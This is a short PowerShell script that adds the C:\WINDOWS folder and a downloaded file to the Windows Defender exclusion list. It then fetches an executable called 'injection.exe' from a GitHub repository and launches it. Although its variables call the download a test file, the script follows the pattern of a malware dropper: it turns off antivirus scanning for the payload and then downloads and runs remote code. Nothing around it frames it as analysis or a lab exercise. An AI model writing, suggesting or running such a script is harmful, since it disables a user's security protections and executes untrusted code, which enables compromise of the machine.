Add-MpPreference -ExclusionPath "C:\WINDOWS"
$testFileUrl = "https://github.com/robertoaguilarfields-blip/my-proyecto/raw/refs/heads/main/injection.exe"
$testFilePath = "C:\WINDOWS\injection.exe"
Invoke-WebRequest -Uri $testFileUrl -OutFile $testFilePath
Add-MpPreference -ExclusionPath $testFilePath
Start-Process $testFilePath